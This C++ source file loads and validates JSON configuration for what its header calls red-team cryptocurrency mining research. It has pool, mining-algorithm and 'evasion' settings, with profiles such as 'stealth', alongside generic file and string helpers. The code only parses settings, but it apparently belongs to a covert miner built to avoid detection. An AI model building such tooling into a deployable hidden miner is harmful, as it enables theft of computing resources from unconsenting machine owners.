// config_loader.cpp - Configuration File Loader
// RED TEAM RESEARCH - Configuration management for mining research

#include "utils.h"
#include <fstream>
#include <sstream>
#include <iostream>

namespace redteam {
namespace utils {

// ============================================================================
// ConfigLoader Implementation
// ============================================================================

ConfigLoader::ConfigLoader(const std::string& config_path)
    : config_path_(config_path)
{
}

ConfigLoader::~ConfigLoader() = default;

bool ConfigLoader::load() {
    // Check if file exists
    if (!file::exists(config_path_)) {
        validation_errors_ = "Configuration file does not exist: " + config_path_;
        return false;
    }

    // Read file content
    std::string content = file::read_file(config_path_);
    if (content.empty()) {
        validation_errors_ = "Configuration file is empty or unreadable: " + config_path_;
        return false;
    }

    // Parse JSON
    try {
        config_data_ = json::parse(content);
    } catch (const json::parse_error& e) {
        validation_errors_ = std::string("JSON parse error: ") + e.what();
        return false;
    }

    // Validate configuration
    if (!validate()) {
        return false;
    }

    std::cout << "[Config] Successfully loaded: " << config_path_ << std::endl;
    return true;
}

json ConfigLoader::get_mining_config() const {
    if (config_data_.contains("mining")) {
        return config_data_["mining"];
    }
    return json::object();
}

json ConfigLoader::get_pool_config() const {
    if (config_data_.contains("pool")) {
        return config_data_["pool"];
    }
    return json::object();
}

json ConfigLoader::get_evasion_config() const {
    if (config_data_.contains("evasion")) {
        return config_data_["evasion"];
    }
    return json::object();
}

json ConfigLoader::get_gpu_config() const {
    if (config_data_.contains("gpu")) {
        return config_data_["gpu"];
    }
    return json::object();
}

template<typename T>
T ConfigLoader::get(const std::string& key, const T& default_value) const {
    // Support nested keys with dot notation (e.g., "pool.url")
    std::vector<std::string> keys = string::split(key, '.');

    json current = config_data_;
    for (const auto& k : keys) {
        if (!current.contains(k)) {
            return default_value;
        }
        current = current[k];
    }

    try {
        return current.get<T>();
    } catch (...) {
        return default_value;
    }
}

// Explicit template instantiations
template std::string ConfigLoader::get<std::string>(const std::string&, const std::string&) const;
template int ConfigLoader::get<int>(const std::string&, const int&) const;
template uint32_t ConfigLoader::get<uint32_t>(const std::string&, const uint32_t&) const;
template double ConfigLoader::get<double>(const std::string&, const double&) const;
template bool ConfigLoader::get<bool>(const std::string&, const bool&) const;

bool ConfigLoader::validate() const {
    validation_errors_.clear();
    std::stringstream errors;

    bool valid = true;

    // Validate required sections
    if (!config_data_.contains("pool")) {
        errors << "Missing required section: 'pool'\n";
        valid = false;
    } else {
        valid = validate_pool_config() && valid;
    }

    if (!config_data_.contains("mining")) {
        errors << "Missing required section: 'mining'\n";
        valid = false;
    } else {
        valid = validate_mining_config() && valid;
    }

    // Evasion config is optional but validate if present
    if (config_data_.contains("evasion")) {
        valid = validate_evasion_config() && valid;
    }

    validation_errors_ = errors.str();
    return valid;
}

std::string ConfigLoader::get_validation_errors() const {
    return validation_errors_;
}

bool ConfigLoader::validate_pool_config() const {
    auto pool = config_data_["pool"];

    // Required fields
    if (!pool.contains("url")) {
        validation_errors_ += "Pool config missing 'url'\n";
        return false;
    }
    if (!pool.contains("port")) {
        validation_errors_ += "Pool config missing 'port'\n";
        return false;
    }
    if (!pool.contains("worker")) {
        validation_errors_ += "Pool config missing 'worker'\n";
        return false;
    }

    // Validate port range
    uint16_t port = pool["port"].get<uint16_t>();
    if (port < 1 || port > 65535) {
        validation_errors_ += "Pool port out of range (1-65535)\n";
        return false;
    }

    return true;
}

bool ConfigLoader::validate_mining_config() const {
    auto mining = config_data_["mining"];

    // Required fields
    if (!mining.contains("algorithm")) {
        validation_errors_ += "Mining config missing 'algorithm'\n";
        return false;
    }

    std::string algo = mining["algorithm"].get<std::string>();
    if (algo != "kawpow" && algo != "ethash" && algo != "etchash") {
        validation_errors_ += "Unsupported algorithm: " + algo + "\n";
        return false;
    }

    return true;
}

bool ConfigLoader::validate_evasion_config() const {
    auto evasion = config_data_["evasion"];

    // Validate profile if present
    if (evasion.contains("profile")) {
        std::string profile = evasion["profile"].get<std::string>();
        std::vector<std::string> valid_profiles = {
            "stealth", "aggressive", "balanced", "minimal"
        };

        bool found = false;
        for (const auto& p : valid_profiles) {
            if (profile == p) {
                found = true;
                break;
            }
        }

        if (!found) {
            validation_errors_ += "Invalid evasion profile: " + profile + "\n";
            return false;
        }
    }

    return true;
}

// ============================================================================
// File Utilities Implementation
// ============================================================================

namespace file {

bool exists(const std::string& path) {
    std::ifstream file(path);
    return file.good();
}

bool is_readable(const std::string& path) {
    std::ifstream file(path);
    return file.good();
}

bool is_writable(const std::string& path) {
    std::ofstream file(path, std::ios::app);
    return file.good();
}

std::string read_file(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return "";
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

bool write_file(const std::string& path, const std::string& content) {
    std::ofstream file(path);
    if (!file.is_open()) {
        return false;
    }

    file << content;
    return file.good();
}

std::string get_absolute_path(const std::string& path) {
    char resolved_path[PATH_MAX];
    if (realpath(path.c_str(), resolved_path) != nullptr) {
        return std::string(resolved_path);
    }
    return path;
}

} // namespace file

// ============================================================================
// String Utilities Implementation
// ============================================================================

namespace string {

std::string trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\n\r");
    if (start == std::string::npos) {
        return "";
    }
    size_t end = str.find_last_not_of(" \t\n\r");
    return str.substr(start, end - start + 1);
}

std::vector<std::string> split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::stringstream ss(str);
    std::string token;

    while (std::getline(ss, token, delimiter)) {
        tokens.push_back(token);
    }

    return tokens;
}

std::string to_lower(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
    return result;
}

std::string to_upper(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::toupper);
    return result;
}

bool starts_with(const std::string& str, const std::string& prefix) {
    return str.size() >= prefix.size() &&
           str.compare(0, prefix.size(), prefix) == 0;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    return str.size() >= suffix.size() &&
           str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

std::string format(const char* fmt, ...) {
    char buffer[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    return std::string(buffer);
}

} // namespace string

} // namespace utils
} // namespace redteam
